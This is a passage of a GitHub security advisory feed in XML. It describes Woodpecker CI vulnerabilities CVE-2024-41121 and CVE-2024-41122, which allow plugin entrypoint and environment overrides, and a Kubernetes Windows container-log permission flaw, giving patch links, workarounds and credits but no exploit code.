<li><a href="https://github.com/woodpecker-ci/woodpecker/pull/3933">https://github.com/woodpecker-ci/woodpecker/pull/3933</a></li>
<li><a href="https://github.com/woodpecker-ci/woodpecker-security/pull/11">https://github.com/woodpecker-ci/woodpecker-security/pull/11</a></li>
<li><a href="https://github.com/woodpecker-ci/woodpecker-security/issues/8">https://github.com/woodpecker-ci/woodpecker-security/issues/8</a> (info will be published later at <a href="https://github.com/woodpecker-ci/woodpecker/issues/3924">https://github.com/woodpecker-ci/woodpecker/issues/3924</a>)</li>
<li><a href="https://github.com/woodpecker-ci/woodpecker-security/issues/9">https://github.com/woodpecker-ci/woodpecker-security/issues/9</a> (info will be published later at <a href="https://github.com/woodpecker-ci/woodpecker/issues/3924">https://github.com/woodpecker-ci/woodpecker/issues/3924</a>)</li>
<li><a href="https://github.com/woodpecker-ci/woodpecker/issues/3924">https://github.com/woodpecker-ci/woodpecker/issues/3924</a> (info will be published later once we got adoption of the update)</li>
</ul>
<h3 id="credits">Credits</h3>
<ul>
<li>Daniel Kilimnik <a href="https://x.com/D_K_Dev">@D_K_Dev</a> (Neodyme AG)</li>
<li>Felipe Custodio Romero <a href="https://x.com/_localo_">@<em>localo</em></a> (Neodyme AG)</li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/woodpecker-ci/woodpecker/security/advisories/GHSA-xw35-rrcp-g7xm">https://github.com/woodpecker-ci/woodpecker/security/advisories/GHSA-xw35-rrcp-g7xm</a></li>
<li><a href="https://github.com/woodpecker-ci/woodpecker/issues/3924">https://github.com/woodpecker-ci/woodpecker/issues/3924</a></li>
<li><a href="https://github.com/woodpecker-ci/woodpecker/pull/3933">https://github.com/woodpecker-ci/woodpecker/pull/3933</a></li>
<li><a href="https://github.com/woodpecker-ci/woodpecker/commit/764329ed1dbc47c4a517ccc749e3feb34059fac8">https://github.com/woodpecker-ci/woodpecker/commit/764329ed1dbc47c4a517ccc749e3feb34059fac8</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-41121">https://nvd.nist.gov/vuln/detail/CVE-2024-41121</a></li>
<li><a href="https://github.com/woodpecker-ci/woodpecker-security/issues/8">https://github.com/woodpecker-ci/woodpecker-security/issues/8</a></li>
<li><a href="https://github.com/woodpecker-ci/woodpecker-security/issues/9">https://github.com/woodpecker-ci/woodpecker-security/issues/9</a></li>
<li><a href="https://github.com/woodpecker-ci/woodpecker-security/pull/11">https://github.com/woodpecker-ci/woodpecker-security/pull/11</a></li>
<li><a href="https://github.com/advisories/GHSA-xw35-rrcp-g7xm">https://github.com/advisories/GHSA-xw35-rrcp-g7xm</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-xw35-rrcp-g7xm</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-07-19T19:59:08.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[go.woodpecker-ci.org/woodpecker/v2] Woodpecker's custom workspace allow to overwrite plugin entrypoint executable]]></title>
        <id>https://github.com/advisories/GHSA-xw35-rrcp-g7xm</id>
        <link href="https://github.com/advisories/GHSA-xw35-rrcp-g7xm"/>
        <updated>2024-07-22T13:18:37.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The server allow to create any user who can trigger a pipeline run malicious workflows:</p>
<ul>
<li>Those workflows can either lead to a host takeover that runs the agent executing the workflow.</li>
<li>Or allow to extract the secrets who would be normally provided to the plugins who's entrypoint are overwritten.</li>
</ul>
<h3 id="patches">Patches</h3>
<p><a href="https://github.com/woodpecker-ci/woodpecker/pull/3933">https://github.com/woodpecker-ci/woodpecker/pull/3933</a></p>
<h3 id="workarounds">Workarounds</h3>
<p><em>Is there a way for users to fix or remediate the vulnerability without upgrading?</em>
<strong>Enable the "gated" repo feature and review each change upfront</strong></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/woodpecker-ci/woodpecker/pull/3933">https://github.com/woodpecker-ci/woodpecker/pull/3933</a></li>
<li><a href="https://github.com/woodpecker-ci/woodpecker-security/pull/11">https://github.com/woodpecker-ci/woodpecker-security/pull/11</a></li>
<li><a href="https://github.com/woodpecker-ci/woodpecker-security/issues/8">https://github.com/woodpecker-ci/woodpecker-security/issues/8</a> (info will be published later at <a href="https://github.com/woodpecker-ci/woodpecker/issues/3924">https://github.com/woodpecker-ci/woodpecker/issues/3924</a>)</li>
<li><a href="https://github.com/woodpecker-ci/woodpecker-security/issues/9">https://github.com/woodpecker-ci/woodpecker-security/issues/9</a> (info will be published later at <a href="https://github.com/woodpecker-ci/woodpecker/issues/3924">https://github.com/woodpecker-ci/woodpecker/issues/3924</a>)</li>
<li><a href="https://github.com/woodpecker-ci/woodpecker/issues/3924">https://github.com/woodpecker-ci/woodpecker/issues/3924</a> (info will be published later once we got adoption of the update)</li>
</ul>
<h3 id="credits">Credits</h3>
<ul>
<li>Daniel Kilimnik <a href="https://x.com/D_K_Dev">@D_K_Dev</a> (Neodyme AG)</li>
<li>Felipe Custodio Romero <a href="https://x.com/_localo_">@<em>localo</em></a> (Neodyme AG)</li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/woodpecker-ci/woodpecker/security/advisories/GHSA-xw35-rrcp-g7xm">https://github.com/woodpecker-ci/woodpecker/security/advisories/GHSA-xw35-rrcp-g7xm</a></li>
<li><a href="https://github.com/woodpecker-ci/woodpecker/issues/3924">https://github.com/woodpecker-ci/woodpecker/issues/3924</a></li>
<li><a href="https://github.com/woodpecker-ci/woodpecker/pull/3933">https://github.com/woodpecker-ci/woodpecker/pull/3933</a></li>
<li><a href="https://github.com/woodpecker-ci/woodpecker/commit/764329ed1dbc47c4a517ccc749e3feb34059fac8">https://github.com/woodpecker-ci/woodpecker/commit/764329ed1dbc47c4a517ccc749e3feb34059fac8</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-41121">https://nvd.nist.gov/vuln/detail/CVE-2024-41121</a></li>
<li><a href="https://github.com/woodpecker-ci/woodpecker-security/issues/8">https://github.com/woodpecker-ci/woodpecker-security/issues/8</a></li>
<li><a href="https://github.com/woodpecker-ci/woodpecker-security/issues/9">https://github.com/woodpecker-ci/woodpecker-security/issues/9</a></li>
<li><a href="https://github.com/woodpecker-ci/woodpecker-security/pull/11">https://github.com/woodpecker-ci/woodpecker-security/pull/11</a></li>
<li><a href="https://github.com/advisories/GHSA-xw35-rrcp-g7xm">https://github.com/advisories/GHSA-xw35-rrcp-g7xm</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-xw35-rrcp-g7xm</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-07-19T19:59:08.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[go.woodpecker-ci.org/woodpecker] Woodpecker's custom environment variables allow to alter execution flow of plugins]]></title>
        <id>https://github.com/advisories/GHSA-3wf2-2pq4-4rvc</id>
        <link href="https://github.com/advisories/GHSA-3wf2-2pq4-4rvc"/>
        <updated>2024-07-22T13:17:48.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The server allow to create any user who can trigger a pipeline run malicious workflows:</p>
<ul>
<li>Those workflows can either lead to a host takeover that runs the agent executing the workflow.</li>
<li>Or allow to extract the secrets who would be normally provided to the plugins who's entrypoint are overwritten.</li>
</ul>
<h3 id="patches">Patches</h3>
<p><a href="https://github.com/woodpecker-ci/woodpecker/pull/3909">https://github.com/woodpecker-ci/woodpecker/pull/3909</a>
<a href="https://github.com/woodpecker-ci/woodpecker/pull/3934">https://github.com/woodpecker-ci/woodpecker/pull/3934</a></p>
<h3 id="workarounds">Workarounds</h3>
<p><em>Is there a way for users to fix or remediate the vulnerability without upgrading?</em>
<strong>Enable the "gated" repo feature and review each change upfront of running</strong></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/woodpecker-ci/woodpecker/pull/3909">https://github.com/woodpecker-ci/woodpecker/pull/3909</a></li>
<li><a href="https://github.com/woodpecker-ci/woodpecker/pull/3934">https://github.com/woodpecker-ci/woodpecker/pull/3934</a></li>
<li><a href="https://github.com/woodpecker-ci/woodpecker-security/issues/10">https://github.com/woodpecker-ci/woodpecker-security/issues/10</a> (info will be published later at <a href="https://github.com/woodpecker-ci/woodpecker/issues/3929">https://github.com/woodpecker-ci/woodpecker/issues/3929</a>)</li>
<li><a href="https://github.com/woodpecker-ci/woodpecker/issues/3929">https://github.com/woodpecker-ci/woodpecker/issues/3929</a> (info will be published later once we got adoption of the update)</li>
</ul>
<h3 id="credits">Credits</h3>
<ul>
<li>Daniel Kilimnik <a href="https://x.com/D_K_Dev">@D_K_Dev</a> (Neodyme AG)</li>
<li>Felipe Custodio Romero <a href="https://x.com/_localo_">@<em>localo</em></a> (Neodyme AG)</li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/woodpecker-ci/woodpecker/security/advisories/GHSA-3wf2-2pq4-4rvc">https://github.com/woodpecker-ci/woodpecker/security/advisories/GHSA-3wf2-2pq4-4rvc</a></li>
<li><a href="https://github.com/woodpecker-ci/woodpecker/issues/3929">https://github.com/woodpecker-ci/woodpecker/issues/3929</a></li>
<li><a href="https://github.com/woodpecker-ci/woodpecker/pull/3909">https://github.com/woodpecker-ci/woodpecker/pull/3909</a></li>
<li><a href="https://github.com/woodpecker-ci/woodpecker/pull/3934">https://github.com/woodpecker-ci/woodpecker/pull/3934</a></li>
<li><a href="https://github.com/woodpecker-ci/woodpecker/commit/8aa3e5ec82c92eca3279e4be68625111eeedf1c4">https://github.com/woodpecker-ci/woodpecker/commit/8aa3e5ec82c92eca3279e4be68625111eeedf1c4</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-41122">https://nvd.nist.gov/vuln/detail/CVE-2024-41122</a></li>
<li><a href="https://github.com/woodpecker-ci/woodpecker-security/issues/10">https://github.com/woodpecker-ci/woodpecker-security/issues/10</a></li>
<li><a href="https://github.com/advisories/GHSA-3wf2-2pq4-4rvc">https://github.com/advisories/GHSA-3wf2-2pq4-4rvc</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3wf2-2pq4-4rvc</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-07-19T19:59:06.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[go.woodpecker-ci.org/woodpecker/v2] Woodpecker's custom environment variables allow to alter execution flow of plugins]]></title>
        <id>https://github.com/advisories/GHSA-3wf2-2pq4-4rvc</id>
        <link href="https://github.com/advisories/GHSA-3wf2-2pq4-4rvc"/>
        <updated>2024-07-22T13:17:48.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The server allow to create any user who can trigger a pipeline run malicious workflows:</p>
<ul>
<li>Those workflows can either lead to a host takeover that runs the agent executing the workflow.</li>
<li>Or allow to extract the secrets who would be normally provided to the plugins who's entrypoint are overwritten.</li>
</ul>
<h3 id="patches">Patches</h3>
<p><a href="https://github.com/woodpecker-ci/woodpecker/pull/3909">https://github.com/woodpecker-ci/woodpecker/pull/3909</a>
<a href="https://github.com/woodpecker-ci/woodpecker/pull/3934">https://github.com/woodpecker-ci/woodpecker/pull/3934</a></p>
<h3 id="workarounds">Workarounds</h3>
<p><em>Is there a way for users to fix or remediate the vulnerability without upgrading?</em>
<strong>Enable the "gated" repo feature and review each change upfront of running</strong></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/woodpecker-ci/woodpecker/pull/3909">https://github.com/woodpecker-ci/woodpecker/pull/3909</a></li>
<li><a href="https://github.com/woodpecker-ci/woodpecker/pull/3934">https://github.com/woodpecker-ci/woodpecker/pull/3934</a></li>
<li><a href="https://github.com/woodpecker-ci/woodpecker-security/issues/10">https://github.com/woodpecker-ci/woodpecker-security/issues/10</a> (info will be published later at <a href="https://github.com/woodpecker-ci/woodpecker/issues/3929">https://github.com/woodpecker-ci/woodpecker/issues/3929</a>)</li>
<li><a href="https://github.com/woodpecker-ci/woodpecker/issues/3929">https://github.com/woodpecker-ci/woodpecker/issues/3929</a> (info will be published later once we got adoption of the update)</li>
</ul>
<h3 id="credits">Credits</h3>
<ul>
<li>Daniel Kilimnik <a href="https://x.com/D_K_Dev">@D_K_Dev</a> (Neodyme AG)</li>
<li>Felipe Custodio Romero <a href="https://x.com/_localo_">@<em>localo</em></a> (Neodyme AG)</li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/woodpecker-ci/woodpecker/security/advisories/GHSA-3wf2-2pq4-4rvc">https://github.com/woodpecker-ci/woodpecker/security/advisories/GHSA-3wf2-2pq4-4rvc</a></li>
<li><a href="https://github.com/woodpecker-ci/woodpecker/issues/3929">https://github.com/woodpecker-ci/woodpecker/issues/3929</a></li>
<li><a href="https://github.com/woodpecker-ci/woodpecker/pull/3909">https://github.com/woodpecker-ci/woodpecker/pull/3909</a></li>
<li><a href="https://github.com/woodpecker-ci/woodpecker/pull/3934">https://github.com/woodpecker-ci/woodpecker/pull/3934</a></li>
<li><a href="https://github.com/woodpecker-ci/woodpecker/commit/8aa3e5ec82c92eca3279e4be68625111eeedf1c4">https://github.com/woodpecker-ci/woodpecker/commit/8aa3e5ec82c92eca3279e4be68625111eeedf1c4</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-41122">https://nvd.nist.gov/vuln/detail/CVE-2024-41122</a></li>
<li><a href="https://github.com/woodpecker-ci/woodpecker-security/issues/10">https://github.com/woodpecker-ci/woodpecker-security/issues/10</a></li>
<li><a href="https://github.com/advisories/GHSA-3wf2-2pq4-4rvc">https://github.com/advisories/GHSA-3wf2-2pq4-4rvc</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3wf2-2pq4-4rvc</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-07-19T19:59:06.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[k8s.io/kubernetes] Kubernetes sets incorrect permissions on Windows containers logs]]></title>
        <id>https://github.com/advisories/GHSA-82m2-cv7p-4m75</id>
        <link href="https://github.com/advisories/GHSA-82m2-cv7p-4m75"/>
        <updated>2024-07-18T21:58:16.000Z</updated>
        <content type="html"><![CDATA[<p>A security issue was discovered in Kubernetes clusters with Windows nodes where BUILTIN\Users&nbsp;may be able to read container logs and NT AUTHORITY\Authenticated Users&nbsp;may be able to modify container logs.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-5321">https://nvd.nist.gov/vuln/detail/CVE-2024-5321</a></li>
<li><a href="https://github.com/kubernetes/kubernetes/issues/126161">https://github.com/kubernetes/kubernetes/issues/126161</a></li>
<li><a href="https://groups.google.com/g/kubernetes-security-announce/c/81c0BHkKNt0">https://groups.google.com/g/kubernetes-security-announce/c/81c0BHkKNt0</a></li>
<li><a href="https://github.com/kubernetes/kubernetes/commit/23660a78ae462a6c8c75ac7ffd9af97550dda1aa">https://github.com/kubernetes/kubernetes/commit/23660a78ae462a6c8c75ac7ffd9af97550dda1aa</a></li>
<li><a href="https://github.com/kubernetes/kubernetes/commit/84beb2915fa28ae477fe0676be8ba94ccd2b811a">https://github.com/kubernetes/kubernetes/commit/84beb2915fa28ae477fe0676be8ba94ccd2b811a</a></li>
<li><a href="https://github.com/kubernetes/kubernetes/commit/90589b8f63d28bcd3db89749950ebc48ed07c190">https://github.com/kubernetes/kubernetes/commit/90589b8f63d28bcd3db89749950ebc48ed07c190</a></li>
<li><a href="https://github.com/kubernetes/kubernetes/commit/de2033033b1d202ecaaa79d41861a075df8b49c1">https://github.com/kubernetes/kubernetes/commit/de2033033b1d202ecaaa79d41861a075df8b49c1</a></li>
<li><a href="https://github.com/advisories/GHSA-82m2-cv7p-4m75">https://github.com/advisories/GHSA-82m2-cv7p-4m75</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-82m2-cv7p-4m75</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-07-18T21:30:38.000Z</published>
    </entry>
</feed>